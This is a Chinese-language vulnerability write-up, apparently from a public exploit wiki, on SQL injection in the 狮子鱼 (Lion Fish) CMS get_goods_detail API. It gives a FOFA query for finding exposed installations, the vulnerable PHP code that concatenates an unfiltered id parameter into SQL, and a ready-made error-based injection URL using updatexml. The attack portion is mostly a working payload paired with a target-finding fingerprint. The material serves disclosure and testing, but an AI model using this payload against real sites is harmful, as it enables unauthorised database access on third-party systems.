# 狮子鱼CMS ApigoodsController.class.php SQL注入漏洞

## 漏洞描述

狮子鱼CMS ApiController.class.php 参数过滤存在不严谨，导致SQL注入漏洞

## 漏洞影响

> [!NOTE]
>
> 狮子鱼CMS

## FOFA

> [!NOTE]
>
> "/seller.php?s=/Public/login"

## 漏洞复现

登录页面如下

![](http://wikioss.peiqi.tech/vuln/szy-1.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)

存在漏洞的文件为 **ApigoodsController.class.php **, 关键位置为

```php
 public function get_goods_detail() {
        $id = I('get.id');
        $pin_id = I('get.pin_id', 0);
		
		$token = I('get.token');
		
		$weprogram_token = M('weprogram_token')->field('member_id')->where( array('token' =>$token) )->find();
		$member_id = $weprogram_token['member_id'];
		
		
		 
		
        $need_data = array();
        $sql = "select g.*,gd.description,gd.is_untake_level,level_discount,gd.video_src,gd.video_size_width,gd.vedio_size_height,gd.is_video,
            gd.summary,gd.share_title,gd.activity_summary,gd.tag from " . C('DB_PREFIX') . "goods g," . C('DB_PREFIX') . "goods_description gd where g.goods_id=gd.goods_id and g.goods_id=" . $id;
        $goods = M()->query($sql);
        $pin_model = D('Home/Pin');
        $goods_model = D('Home/Goods');
        $qian = array(
            "/Uploads/image"
        );
		$c_site_url = str_replace('/dan','',C('SITE_URL'));
        $hou = array(
            $c_site_url . "/Uploads/image"
        );
		$goods[0]['video_src'] = C('SITE_URL')."Uploads/http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/".$goods[0]['video_src'];
		
        $goods[0]['description'] = str_replace($qian, $hou, $goods[0]['description']);
        $goods[0]['description'] = htmlspecialchars_decode($goods[0]['description']);
        $qian = array(
            "\r\n"
        );
```

![](http://wikioss.peiqi.tech/vuln/szy-6.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)

漏洞测试为

```
https://xxx.xxx.xx.xxx/index.php?s=apigoods/get_goods_detail&id=1%20and%20updatexml(1,concat(0x7e,md5(1),0x7e),1)
```

![](http://wikioss.peiqi.tech/vuln/szy-7.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)